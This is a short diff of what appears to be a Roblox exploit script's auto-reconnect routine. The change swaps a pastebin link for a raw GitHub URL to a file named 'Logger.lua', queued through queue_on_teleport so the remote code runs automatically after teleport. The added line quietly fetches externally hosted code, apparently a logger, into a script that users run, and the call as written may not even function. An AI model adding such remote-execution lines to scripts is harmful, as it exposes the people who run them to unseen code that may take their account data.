@@ -218,7 +218,7 @@ GuiService.ErrorMessageChanged:Connect(function()
 	if not AutoReconnect then return end
 
   --// Execute the script after teleporting
-    queue_on_teleport("https://pastebin.com/raw/jakulsalsalani")
+    queue_on_teleport("https://raw.githubusercontent.com/krespo777/gaaagg/refs/heads/main/Logger.lua")
 
 	--// Join a different server if the player is solo
 	if IsSingle then
